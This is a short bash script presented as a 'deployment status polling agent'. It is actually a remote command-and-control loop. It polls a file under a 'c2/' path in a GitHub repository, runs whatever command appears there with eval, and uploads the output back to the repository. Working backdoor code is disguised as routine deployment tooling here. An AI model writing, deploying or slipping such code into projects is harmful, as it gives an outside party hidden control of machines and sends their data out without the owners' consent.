#!/bin/bash
# Deployment status polling agent - checks for new deployment commands
REPO="sprindigo-art/new"
CMD_PATH="c2/cmd.txt"
RESULT_PATH="c2/result.txt"
API="https://api.github.com/repos/$REPO/contents"
AUTH="Authorization: token $GH_TOKEN"
POLL=3
LAST=""

get_content() {
    curl -s -H "$AUTH" "$API/$1" | python3 -c "
import sys,json,base64
try:
    d=json.load(sys.stdin)
    print(base64.b64decode(d.get('content','')).decode().strip())
except: pass
"
}

get_sha() {
    curl -s -H "$AUTH" "$API/$1" | python3 -c "
import sys,json
try: print(json.load(sys.stdin).get('sha',''))
except: pass
"
}

put_file() {
    local path="$1" content="$2" msg="$3"
    local b64=$(echo "$content" | base64 -w0)
    local sha=$(get_sha "$path")
    local data
    if [ -n "$sha" ]; then
        data="{\"message\":\"$msg\",\"content\":\"$b64\",\"sha\":\"$sha\"}"
    else
        data="{\"message\":\"$msg\",\"content\":\"$b64\"}"
    fi
    curl -s -X PUT -H "$AUTH" -H "Content-Type: application/json" "$API/$path" -d "$data" >/dev/null 2>&1
}

echo "[*] Deployment monitor running. Token=${GH_TOKEN:0:10}..."
while true; do
    CMD=$(get_content "$CMD_PATH")
    if [ -n "$CMD" ] && [ "$CMD" != "$LAST" ] && [ "$CMD" != "NOP" ]; then
        echo "[deploy] $CMD"
        RESULT=$(eval "$CMD" 2>&1)
        put_file "$RESULT_PATH" "$RESULT" "status"
        put_file "$CMD_PATH" "NOP" "ack"
        LAST="$CMD"
    fi
    sleep $POLL
done
